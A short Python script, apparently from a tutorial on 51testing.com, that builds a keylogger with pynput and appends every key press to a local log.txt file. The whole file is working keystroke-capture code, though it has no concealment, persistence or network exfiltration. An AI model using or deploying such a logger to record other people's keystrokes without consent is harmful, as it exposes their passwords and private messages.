# 用 Python 做一个按键记录器
# http://www.51testing.com/html/61/n-4480261.html
from pynput.keyboard import Listener


def write_to_file(key):
    '''将键鼠输入的内容写入文件'''
    letter = str(key)
    letter = letter.replace("'", "")
    with open("./log.txt", 'a') as f:
        f.write(letter)


if __name__ == '__main__':
    with Listener(on_press=write_to_file) as I:
        I.join()
